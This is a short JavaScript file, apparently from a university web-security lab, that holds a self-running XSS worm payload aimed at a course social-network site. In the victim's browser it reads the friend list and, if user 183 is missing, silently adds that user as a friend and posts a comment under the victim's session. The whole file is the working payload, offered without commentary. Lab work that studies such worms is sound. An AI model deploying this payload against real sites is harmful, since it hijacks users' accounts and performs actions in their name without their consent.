function testworm() {
    var home = $.ajax({
        async: false,
        type: 'GET',
        url: 'http://csec380-core.csec.rit.edu:86/home.php',
        success: function(data) {
            return data;
        }
    });
    var friend = $.ajax({
        async: false,
        type: 'GET',
        url: 'http://csec380-core.csec.rit.edu:86/friends.php',
        success: function(data) {
            return data;
        }
    });
    var eff = friend.responseText;
    var arr= eff.match('^[^<br]*').join().split(',');

    if(eff.match('183') == null){
        $.get("http://csec380-core.csec.rit.edu:86/add_friend.php",{id: 183});
        $.get("http://csec380-core.csec.rit.edu:86/add_comment.php",{id: 183,comment: 'Im your friend now'});
    }
}
testworm();
